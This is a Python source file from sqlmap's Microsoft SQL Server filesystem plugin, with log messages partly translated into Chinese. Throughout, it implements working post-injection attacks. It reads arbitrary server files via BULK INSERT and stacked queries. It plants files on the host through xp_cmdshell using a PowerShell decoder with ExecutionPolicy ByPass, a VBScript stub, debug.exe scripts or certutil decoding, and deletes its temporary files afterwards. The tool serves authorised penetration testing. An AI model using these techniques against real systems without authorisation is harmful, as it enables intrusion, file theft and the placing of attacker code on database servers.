#!/usr/bin/env python

"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import ntpath
import os

from lib.core.common import checkFile
from lib.core.common import getLimitRange
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import posixToNtSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.compat import xrange
from lib.core.convert import encodeBase64
from lib.core.convert import encodeHex
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapNoneDataException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.request import inject

from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def _dataToScr(self, fileContent, chunkName):
        fileLines = []
        fileSize = len(fileContent)
        lineAddr = 0x100
        lineLen = 20

        fileLines.append("n %s" % chunkName)
        fileLines.append("rcx")
        fileLines.append("%x" % fileSize)
        fileLines.append("f 0100 %x 00" % fileSize)

        for fileLine in xrange(0, len(fileContent), lineLen):
            scrString = ""

            for lineChar in fileContent[fileLine:fileLine + lineLen]:
                strLineChar = encodeHex(lineChar, binary=False)

                if not scrString:
                    scrString = "e %x %s" % (lineAddr, strLineChar)
                else:
                    scrString += " %s" % strLineChar

                lineAddr += len(strLineChar) // 2

            fileLines.append(scrString)

        fileLines.append("w")
        fileLines.append("q")

        return fileLines

    def _updateDestChunk(self, fileContent, tmpPath):
        randScr = "tmpf%s.scr" % randomStr(lowercase=True)
        chunkName = randomStr(lowercase=True)
        fileScrLines = self._dataToScr(fileContent, chunkName)

        logger.debug("将调试脚本上载到 %s\\%s, please wait.." % (tmpPath, randScr))

        self.xpCmdshellWriteFile(fileScrLines, tmpPath, randScr)

        logger.debug("生成块文件 %s\\%s 从调试脚本 %s" % (tmpPath, chunkName, randScr))

        commands = (
            "cd \"%s\"" % tmpPath,
            "debug < %s" % randScr,
            "del /F /Q %s" % randScr
        )

        self.execCmd(" & ".join(command for command in commands))

        return chunkName

    def stackedReadFile(self, remoteFile):
        if not kb.bruteMode:
            infoMsg = "提取文件: '%s'" % remoteFile
            logger.info(infoMsg)

        result = []
        txtTbl = self.fileTblName
        hexTbl = "%s%shex" % (self.fileTblName, randomStr())

        self.createSupportTbl(txtTbl, self.tblField, "text")
        inject.goStacked("DROP TABLE %s" % hexTbl)
        inject.goStacked("CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s)" % (hexTbl, self.tblField, "VARCHAR(4096)"))

        logger.debug("正在将文件 '%s'的内容加载到支持表中" % remoteFile)
        inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (txtTbl, remoteFile, randomStr(10), randomStr(10)), silent=True)

        # Reference: https://web.archive.org/web/20120211184457/http://support.microsoft.com/kb/104829
        binToHexQuery = """DECLARE @charset VARCHAR(16)
        DECLARE @counter INT
        DECLARE @hexstr VARCHAR(4096)
        DECLARE @length INT
        DECLARE @chunk INT

        SET @charset = '0123456789ABCDEF'
        SET @counter = 1
        SET @hexstr = ''
        SET @length = (SELECT DATALENGTH(%s) FROM %s)
        SET @chunk = 1024

        WHILE (@counter <= @length)
        BEGIN
            DECLARE @tempint INT
            DECLARE @firstint INT
            DECLARE @secondint INT

            SET @tempint = CONVERT(INT, (SELECT ASCII(SUBSTRING(%s, @counter, 1)) FROM %s))
            SET @firstint = floor(@tempint/16)
            SET @secondint = @tempint - (@firstint * 16)
            SET @hexstr = @hexstr + SUBSTRING(@charset, @firstint+1, 1) + SUBSTRING(@charset, @secondint+1, 1)

            SET @counter = @counter + 1

            IF @counter %% @chunk = 0
            BEGIN
                INSERT INTO %s(%s) VALUES(@hexstr)
                SET @hexstr = ''
            END
        END

        IF @counter %% (@chunk) != 0
        BEGIN
            INSERT INTO %s(%s) VALUES(@hexstr)
        END
        """ % (self.tblField, txtTbl, self.tblField, txtTbl, hexTbl, self.tblField, hexTbl, self.tblField)

        binToHexQuery = binToHexQuery.replace("    ", "").replace("\n", " ")
        inject.goStacked(binToHexQuery)

        if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
            result = inject.getValue("SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl), resumeValue=False, blind=False, time=False, error=False)

        if not result:
            result = []
            count = inject.getValue("SELECT COUNT(*) FROM %s" % (hexTbl), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

            if not isNumPosStrValue(count):
                errMsg = "无法检索 "
                errMsg += "文件 '%s'" % remoteFile
                raise SqlmapNoneDataException(errMsg)

            indexRange = getLimitRange(count)

            for index in indexRange:
                chunk = inject.getValue("SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %d %s FROM %s ORDER BY id ASC) ORDER BY id ASC" % (self.tblField, hexTbl, self.tblField, index, self.tblField, hexTbl), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
                result.append(chunk)

        inject.goStacked("DROP TABLE %s" % hexTbl)

        return result

    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        errMsg = "Microsoft SQL Server不支持使用 "
        errMsg += "UNION查询SQL注入技术"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def _stackedWriteFilePS(self, tmpPath, localFileContent, remoteFile, fileType):
        infoMsg = "使用PowerShell将 %s 文件内容 " % fileType
        infoMsg += "写入文件 '%s'" % remoteFile
        logger.info(infoMsg)

        encodedFileContent = encodeBase64(localFileContent, binary=False)
        encodedBase64File = "tmpf%s.txt" % randomStr(lowercase=True)
        encodedBase64FilePath = "%s\\%s" % (tmpPath, encodedBase64File)

        randPSScript = "tmpps%s.ps1" % randomStr(lowercase=True)
        randPSScriptPath = "%s\\%s" % (tmpPath, randPSScript)

        localFileSize = len(encodedFileContent)
        chunkMaxSize = 1024

        logger.debug("将base64编码文件上载到 %s,请稍候.." % encodedBase64FilePath)

        for i in xrange(0, localFileSize, chunkMaxSize):
            wEncodedChunk = encodedFileContent[i:i + chunkMaxSize]
            self.xpCmdshellWriteFile(wEncodedChunk, tmpPath, encodedBase64File)

        psString = "$Base64 = Get-Content -Path \"%s\"; " % encodedBase64FilePath
        psString += "$Base64 = $Base64 -replace \"`t|`n|`r\",\"\"; $Content = "
        psString += "[System.Convert]::FromBase64String($Base64); Set-Content "
        psString += "-Path \"%s\" -Value $Content -Encoding Byte" % remoteFile

        logger.debug("将PowerShell base64解码脚本上载到 %s" % randPSScriptPath)
        self.xpCmdshellWriteFile(psString, tmpPath, randPSScript)

        logger.debug("执行PowerShell base64解码脚本以编写 %s 文件, 请骚等.." % remoteFile)

        commands = (
            "powershell -ExecutionPolicy ByPass -File \"%s\"" % randPSScriptPath,
            "del /F /Q \"%s\"" % encodedBase64FilePath,
            "del /F /Q \"%s\"" % randPSScriptPath
        )

        self.execCmd(" & ".join(command for command in commands))

    def _stackedWriteFileDebugExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):
        infoMsg = "使用debug.exe %s " % fileType
        infoMsg += "将文件内容写入文件'%s', 请骚等.." % remoteFile
        logger.info(infoMsg)

        remoteFileName = ntpath.basename(remoteFile)
        sFile = "%s\\%s" % (tmpPath, remoteFileName)
        localFileSize = os.path.getsize(localFile)
        debugSize = 0xFF00

        if localFileSize < debugSize:
            chunkName = self._updateDestChunk(localFileContent, tmpPath)

            debugMsg = "重命名块文件 %s\\%s to %s " % (tmpPath, chunkName, fileType)
            debugMsg += "文件 %s\\%s 并将其移动到 %s" % (tmpPath, remoteFileName, remoteFile)
            logger.debug(debugMsg)

            commands = (
                "cd \"%s\"" % tmpPath,
                "ren %s %s" % (chunkName, remoteFileName),
                "move /Y %s %s" % (remoteFileName, remoteFile)
            )

            self.execCmd(" & ".join(command for command in commands))
        else:
            debugMsg = "文件大于 %d bytes. " % debugSize
            debugMsg += "sqlmap将在本地将其拆分为块, "
            debugMsg += "逐块上传并在服务器上重新创建"
            debugMsg += "原始文件, 请骚等.."
            logger.debug(debugMsg)

            for i in xrange(0, localFileSize, debugSize):
                localFileChunk = localFileContent[i:i + debugSize]
                chunkName = self._updateDestChunk(localFileChunk, tmpPath)

                if i == 0:
                    debugMsg = "重命名块 "
                    copyCmd = "ren %s %s" % (chunkName, remoteFileName)
                else:
                    debugMsg = "附加块 "
                    copyCmd = "copy /B /Y %s+%s %s" % (remoteFileName, chunkName, remoteFileName)

                debugMsg += "%s\\%s 到 %s 文件 %s\\%s" % (tmpPath, chunkName, fileType, tmpPath, remoteFileName)
                logger.debug(debugMsg)

                commands = (
                    "cd \"%s\"" % tmpPath,
                    copyCmd,
                    "del /F /Q %s" % chunkName
                )

                self.execCmd(" & ".join(command for command in commands))

            logger.debug("移动 %s 文件 %s 到 %s" % (fileType, sFile, remoteFile))

            commands = (
                "cd \"%s\"" % tmpPath,
                "move /Y %s %s" % (remoteFileName, remoteFile)
            )

            self.execCmd(" & ".join(command for command in commands))

    def _stackedWriteFileVbs(self, tmpPath, localFileContent, remoteFile, fileType):
        infoMsg = " 使用自定义visual basic脚本将"
        infoMsg += "%s 文件内容写入文件 '%s', 请骚等.." % (fileType, remoteFile)
        logger.info(infoMsg)

        randVbs = "tmps%s.vbs" % randomStr(lowercase=True)
        randFile = "tmpf%s.txt" % randomStr(lowercase=True)
        randFilePath = "%s\\%s" % (tmpPath, randFile)

        vbs = """Dim inputFilePath, outputFilePath
        inputFilePath = "%s"
        outputFilePath = "%s"
        Set fs = CreateObject("Scripting.FileSystemObject")
        Set file = fs.GetFile(inputFilePath)
        If file.Size Then
            Wscript.Echo "Loading from: " & inputFilePath
            Wscript.Echo
            Set fd = fs.OpenTextFile(inputFilePath, 1)
            data = fd.ReadAll
            fd.Close
            data = Replace(data, " ", "")
            data = Replace(data, vbCr, "")
            data = Replace(data, vbLf, "")
            Wscript.Echo "Fixed Input: "
            Wscript.Echo data
            Wscript.Echo
            decodedData = base64_decode(data)
            Wscript.Echo "Output: "
            Wscript.Echo decodedData
            Wscript.Echo
            Wscript.Echo "Writing output in: " & outputFilePath
            Wscript.Echo
            Set ofs = CreateObject("Scripting.FileSystemObject").OpenTextFile(outputFilePath, 2, True)
            ofs.Write decodedData
            ofs.close
        Else
            Wscript.Echo "The file is empty."
        End If
        Function base64_decode(byVal strIn)
            Dim w1, w2, w3, w4, n, strOut
            For n = 1 To Len(strIn) Step 4
                w1 = mimedecode(Mid(strIn, n, 1))
                w2 = mimedecode(Mid(strIn, n + 1, 1))
                w3 = mimedecode(Mid(strIn, n + 2, 1))
                w4 = mimedecode(Mid(strIn, n + 3, 1))
                If Not w2 Then _
                strOut = strOut + Chr(((w1 * 4 + Int(w2 / 16)) And 255))
                If  Not w3 Then _
                strOut = strOut + Chr(((w2 * 16 + Int(w3 / 4)) And 255))
                If Not w4 Then _
                strOut = strOut + Chr(((w3 * 64 + w4) And 255))
            Next
            base64_decode = strOut
            End Function
        Function mimedecode(byVal strIn)
            Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
            If Len(strIn) = 0 Then
                mimedecode = -1 : Exit Function
            Else
                mimedecode = InStr(Base64Chars, strIn) - 1
            End If
        End Function""" % (randFilePath, remoteFile)

        vbs = vbs.replace("    ", "")
        encodedFileContent = encodeBase64(localFileContent, binary=False)

        logger.debug("将文件base64编码的内容上载到 %s, 请骚等.." % randFilePath)

        self.xpCmdshellWriteFile(encodedFileContent, tmpPath, randFile)

        logger.debug("上载visualbasic解码器存根 %s\\%s, 请骚等.." % (tmpPath, randVbs))

        self.xpCmdshellWriteFile(vbs, tmpPath, randVbs)

        commands = (
            "cd \"%s\"" % tmpPath,
            "cscript //nologo %s" % randVbs,
            "del /F /Q %s" % randVbs,
            "del /F /Q %s" % randFile
        )

        self.execCmd(" & ".join(command for command in commands))

    def _stackedWriteFileCertutilExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):
        infoMsg = "使用certutil.exe编写 %s " % fileType
        infoMsg += "文件内容到文件 '%s', 请骚等.." % remoteFile
        logger.info(infoMsg)

        chunkMaxSize = 500

        randFile = "tmpf%s.txt" % randomStr(lowercase=True)
        randFilePath = "%s\\%s" % (tmpPath, randFile)

        encodedFileContent = encodeBase64(localFileContent, binary=False)

        splittedEncodedFileContent = '\n'.join([encodedFileContent[i:i + chunkMaxSize] for i in xrange(0, len(encodedFileContent), chunkMaxSize)])

        logger.debug("将文件base64编码的内容上载到 %s, 请骚等.." % randFilePath)

        self.xpCmdshellWriteFile(splittedEncodedFileContent, tmpPath, randFile)

        logger.debug("将文件解码为 %s.." % remoteFile)

        commands = (
            "cd \"%s\"" % tmpPath,
            "certutil -f -decode %s %s" % (randFile, remoteFile),
            "del /F /Q %s" % randFile
        )

        self.execCmd(" & ".join(command for command in commands))

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        # NOTE: this is needed here because we use xp_cmdshell extended
        # procedure to write a file on the back-end Microsoft SQL Server
        # file system
        self.initEnv()
        self.getRemoteTempPath()

        tmpPath = posixToNtSlashes(conf.tmpPath)
        remoteFile = posixToNtSlashes(remoteFile)

        checkFile(localFile)
        localFileContent = open(localFile, "rb").read()

        self._stackedWriteFilePS(tmpPath, localFileContent, remoteFile, fileType)
        written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        if written is False:
            message = "是否要尝试上载文件 "
            message += "自定义Visual Basic脚本技术? [Y/n] "

            if readInput(message, default='Y', boolean=True):
                self._stackedWriteFileVbs(tmpPath, localFileContent, remoteFile, fileType)
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        if written is False:
            message = "是否要尝试上载文件 "
            message += "内置的debug.exe技术? [Y/n] "

            if readInput(message, default='Y', boolean=True):
                self._stackedWriteFileDebugExe(tmpPath, localFile, localFileContent, remoteFile, fileType)
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        if written is False:
            message = "是否要尝试上载文件 "
            message += "内置certutil.exe技术? [Y/n] "

            if readInput(message, default='Y', boolean=True):
                self._stackedWriteFileCertutilExe(tmpPath, localFile, localFileContent, remoteFile, fileType)
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        return written
